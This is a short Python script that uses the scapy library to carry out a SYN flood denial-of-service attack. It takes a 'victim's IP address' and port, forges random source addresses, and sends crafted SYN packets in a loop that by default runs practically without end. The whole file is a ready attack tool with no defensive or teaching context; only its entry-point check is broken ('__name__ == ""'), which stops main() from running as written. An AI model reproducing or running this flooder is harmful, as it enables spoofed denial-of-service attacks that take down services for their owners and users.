import argparse
import random
from scapy.all import send, IP, TCP

DEFAULT_PACK = 9999999999
MAX_PORTS = 65535

def random_IP():
    IP = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return IP

def get_args():
    parser = argparse.ArgumentParser(description="syn flooder\n")
    parser.add_argument('t', help="victim's IP address")
    parser.add_argument('-a', type=int, help="amount of packets(default are infinity)", default=DEFAULT_PACK)
    parser.add_argument('-p', type=int, help="target port(default port is 80)", default=80)
    args = parser.parse_args()
    return args.t, args.p, args.a

def SYN_flood(Target_IP, dPort, packets_to_send):
    print("sending packets to the target...")
    for i in range(packets_to_send):
        seq_n = random.randint(0, MAX_PORTS)
        sPort = random.randint(0, MAX_PORTS)
        Window = random.randint(0, MAX_PORTS)
        src_IP = random_IP()
        packet = IP(dst=Target_IP, src=src_IP)/TCP(sport=sPort, dport=dPort, flags="S", seq=seq_n, window=Window)
        send(packet, verbose=0)
    print("sent all the packets")

def main():
    Target_IP, dPort, packets_to_send = get_args()
    SYN_flood(Target_IP, dPort, packets_to_send)

if __name__ == "":
    main()

